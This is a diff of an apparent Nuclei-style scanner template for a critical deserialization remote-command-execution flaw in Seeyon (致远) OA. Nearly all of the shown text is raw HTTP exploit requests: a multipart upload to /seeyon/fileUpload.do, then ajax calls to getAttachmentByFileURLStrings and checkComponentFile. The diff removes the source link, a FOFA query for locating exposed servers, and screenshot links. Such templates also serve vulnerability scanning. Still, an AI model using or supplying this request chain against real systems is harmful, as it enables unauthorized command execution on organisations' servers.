@@ -3,12 +3,8 @@ info:
   name: 致远OA checkComponentFile存在反序列化任意命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cvv8uvkcrge00455'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cvv8uvkcrge00455
-    fofa: title="致远A8-V5"
 http:
 - raw:
   - 'POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
@@ -48,7 +44,6 @@ http:
     Content-Disposition: form-data; name="extensions"
 
 
-
     ------WebKitFormBoundary7uKDzBJkrUpg9vNV
 
     Content-Disposition: form-data; name="applicationCategory"
@@ -61,11 +56,9 @@ http:
     Content-Disposition: form-data; name="destDirectory"
 
 
-
     ------WebKitFormBoundary7uKDzBJkrUpg9vNV
 
     Content-Disposition: form-data; name="destFilename"
-
 
 
     ------WebKitFormBoundary7uKDzBJkrUpg9vNV
@@ -73,11 +66,9 @@ http:
     Content-Disposition: form-data; name="maxSize"
 
 
-
     ------WebKitFormBoundary7uKDzBJkrUpg9vNV
 
     Content-Disposition: form-data; name="isEncrypt"
-
 
 
     ------WebKitFormBoundary7uKDzBJkrUpg9vNV
@@ -114,7 +105,6 @@ http:
 
     **返回包如下**
 
-    ![](https://cdn.nlark.com/yuque/0/2025/webp/43110909/1766319334247-985fc26c-13d3-4830-bbb0-999a4c456fa0.webp)
 
     **8.0以上返回包如下**
 
@@ -171,11 +161,9 @@ http:
     Content-Disposition: form-data; name="type"
 
 
-
     ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
 
     Content-Disposition: form-data; name="extensions"
-
 
 
     ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
@@ -190,17 +178,14 @@ http:
     Content-Disposition: form-data; name="destDirectory"
 
 
-
     ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
 
     Content-Disposition: form-data; name="destFilename"
 
 
-
     ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
 
     Content-Disposition: form-data; name="maxSize"
-
 
 
     ------WebKitFormBoundaryQKpVtFYI6SiUEy8w
@@ -288,10 +273,8 @@ http:
     avatarImageUrl=1119439116314231940; loginPageURL=
 
 
-
     managerMethod=getAttachmentByFileURLStrings&arguments=["2915117451250715385"]
 
-    ![](https://cdn.nlark.com/yuque/0/2025/webp/43110909/1766319334465-57b97c08-d13f-4e70-8a08-312ecd256dea.webp)
 
     **再拿到返回包中的id数据，发送如下数据包：**'
   redirects: false
@@ -325,10 +308,7 @@ http:
     avatarImageUrl=1119439116314231940; loginPageURL=
 
 
-    managerMethod=checkComponentFile&arguments=["-3767740144639261915","0"]
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/webp/43110909/1766319334720-1397f285-e76e-4d2a-aee2-512393cda9b2.webp)'
+    managerMethod=checkComponentFile&arguments=["-3767740144639261915","0"]'
   redirects: false
   matchers:
   - status:
